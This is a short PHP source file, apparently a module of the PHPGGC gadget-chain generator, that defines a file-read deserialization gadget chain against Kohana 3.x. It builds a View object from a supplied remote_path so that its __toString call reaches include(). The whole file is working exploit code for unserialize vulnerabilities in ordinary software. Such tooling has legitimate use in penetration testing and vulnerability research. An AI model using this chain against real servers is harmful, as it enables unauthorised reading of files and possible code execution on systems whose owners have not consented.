<?php

namespace GadgetChain\Kohana;

class FR1 extends \PHPGGC\GadgetChain\FileRead
{
    public static $version = '3.*';
    public static $vector = '__toString';
    public static $author = 'byq';
    public static $information = 'include()';

    public function generate(array $parameters)
    {
        return new \View($parameters['remote_path']);
    }
}